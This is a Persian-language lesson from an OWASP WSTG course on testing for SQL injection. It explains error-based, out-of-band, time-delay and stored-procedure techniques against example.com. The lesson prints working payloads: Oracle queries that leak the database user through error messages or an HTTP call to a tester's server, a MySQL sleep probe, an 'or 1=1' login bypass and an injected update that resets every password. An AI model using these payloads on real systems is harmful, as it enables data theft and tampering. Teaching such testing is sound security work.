# بررسی SQL Injection

در این بخش از دوره آموزشی OWASP-WSTG به هفتمین بخش از استاندارد WSTG با شناسه WSTG-INPV-05 می پردازیم که مربوط به بررسی SQL Injection می باشد. لازم به ذکر است با توجه به طولانی بودن مبحث تزریق SQL، این بخش از استاندارد OWASP در چندین قسمت قرار داده می شود.

### تکنیک Error Based Exploitation Technique

یک تکنیک Error Based Exploitation زمانی مفید است که تست نفوذگر به دلایلی نمی‌تواند از آسیب‌پذیری تزریق SQL با استفاده از تکنیک‌های دیگر مانند Union استفاده کند. تکنیک Error Based Exploitation شامل مجبور کردن پایگاه‌داده برای اجرای برخی از عملیات‌ها می‌باشد که نتیجه آن بروز یک خطا خواهد بود. سپس تلاش برای استخراج برخی از داده‌ها از پایگاه‌داده و نشان دادن آن در پیام خطا است. این تکنیک بهره‌برداری می‌تواند از DBMS به DBMS دیگر متفاوت باشد.

پرس و جوی SQL زیر را در نظر بگیرید:
```sql
SELECT * FROM products WHERE id_product=$id_product
```


همچنین برنامه ای را در نظر بگیرید که پرس و جوی بالا را اجرا می‌کند:
```url
http://www.example.com/product.php?id=10
```
درخواست بدخواهانه می‌تواند (به عنوان مثال برای Oracle 10g) به شکل زیر باشد:
```sql
http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
```
در این مثال، تست نفوذگر مقدار ۱۰ را با نتیجه تابع UTL_INADDR.GET_HOST_NAME الحاق می‌کند. این تابع در Oracle تلاش خواهد کرد تا Hostname پارامتری که به آن ارسال شده است را بازگرداند که عبارت دیگر کوئری، نام کاربر است. زمانی که پایگاه‌داده به دنبال یک نام میزبان با نام پایگاه‌داده کاربر باشد، شکست خواهد خورد و یک پیغام خطا مانند زیر نمایش می‌دهد:
```text
ORA-292257: host SCOTT unknown
```
سپس تست نفوذگر می‌تواند پارامتر منتقل‌شده به تابع GET_HOST_NAME() را دستکاری کند و نتیجه در پیام خطا نشان داده خواهد شد.

### تکنیک Out of Band Exploitation Technique

این تکنیک زمانی بسیار مفید است که تست نفوذگر یک SQL Injection از نوع Blind را پیدا کند که در آن هیچ چیز در مورد نتیجه یک عملیات معلوم نیست. این تکنیک شامل استفاده از توابع DBMS برای انجام یک اتصال خارج از باند و تحویل نتایج پرس و جوی تزریق‌شده به عنوان بخشی از درخواست به سرور تست نفوذگر است. مانند تکنیک‌های مبتنی بر خطا، هر DBMS ویژگی‌های مخصوص به خود را دارد.

پرس و جوی SQL زیر را در نظر بگیرید:
```sql
SELECT * FROM products WHERE id_product=$id_product
```
همچنین برنامه ای را در نظر بگیرید که پرس و جوی بالا را اجرا می‌کند:
```url
http://www.example.com/product.php?id=10
```

درخواست بدخواهانه می‌تواند به شکل زیر باشد:
```sql
http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80' || (SELECT user FROM DUAL)--
```
در این مثال، تست نفوگر مقدار ۱۰ را با نتیجه تابع UTL_HTTP.requestبه هم متصل می‌کند. این تابع Oracle تلاش خواهد کرد تا به testerserver متصل شود و یک درخواست HTTP GET شامل بازگشت از کاربر SELECT پرس و جو از DAL ایجاد کند. تستر می‌تواند یک وب سرور (‏به عنوان مثال Apache)‏ایجاد کند یا از ابزار Netcat استفاده کند:

```js
/home/tester/nc -nLp 80
GET /SCOTT HTTP/1.1 
Host: testerserver.com 
Connection: close
```
### تکنیک Time Delay Exploitation Technique

تکنیک Time Delay Exploitation زمانی بسیار مفید است که تست نفوذگر آسیب پذیری Blind SQL Injection ای را پیدا کند که در آن نتیجه یک عملیات، مشخص نیست.
این تکنیک شامل ارسال یک پرس و جوی دارای تاخیر زمانی به سمت برنامه بوده و تست نفوذگر می‌تواند با بررسی زمان پاسخ بازگشت داده شده از سرور، در صورت صحیح بودن شرایط، اطلاعات مورد نظر را استخراج نماید. این تکنیک بهره‌برداری می‌تواند از DBMS به DBMS دیگر متفاوت باشد.

پرس و جوی SQL زیر را در نظر بگیرید:
```sql
SELECT * FROM products WHERE id_product=$id_product
```
همچنین برنامه ای را در نظر بگیرید که پرس و جوی بالا را اجرا می‌کند:
```url
http://www.example.com/product.php?id=10
```
درخواست مخرب می‌تواند به عنوان مثال در MySql نسخه 5 به شکل زیر باشد:
```url
http://www.example.com/product.php?id=10 AND IF (version() like ‘5%', sleep(10),'false')) --
```
در این مثال، تست نفوذگر بررسی می‌کند که آیا نسخه MySql ۵ است یا خیر. وی می‌تواند زمان تاخیر را افزایش دهد و پاسخ‌ها را نظارت کند.

### تکنیک Stored Procedure Injection

هنگام استفاده از SQL پویا در یک Stored Procedure، برنامه باید به درستی ورودی کاربر را برای از بین بردن خطر تزریق کد، Sanitize کند. اگر پاک‌سازی به درستی انجام نشود، کاربر می‌تواند دستورات SQL مورد نظر خود را وارد نماید که در Stored Procedure اجرا خواهد شد.

این Stored Procedure زیر را در نظر بگیرید:
```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring = ''
Select 1 from users
Where username = '+ @username + ' and passwd = ' + @passwd '
exec(@sqlstring)
Go
```
ورودی کاربر:
```sql
anyusername or 1=1' 
anypassword
```

این روش ورودی را Sanitize نمی‌کند، بنابراین به مقدار بازگشت اجازه می‌دهد تا یک رکورد موجود با این پارامترها را نشان دهد.

این مثال ممکن است به دلیل استفاده از SQL پویا برای ورود یک کاربر، غیر محتمل به نظر برسد، اما یک Dynamic Reporting Query را در نظر بگیرید که در آن کاربر ستون‌ها را برای مشاهده انتخاب می‌کند. کاربر می‌تواند کد مخرب را وارد این سناریو کرده و داده‌ها را به خطر بیاندازد.

مورد Stored Procedure زیر را در نظر بگیرید:
```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring = ‘’
Select ‘+ @columnamelist + ‘ from ReportTable'
exec(@sqlstring)
Go
```
ورودی کاربر:

```sql
1 from users; update users set password = 'password'; select *
```

این امر منجر به اجرای گزارش و به روز رسانی تمام گذرواژه‌های کاربران خواهد شد.
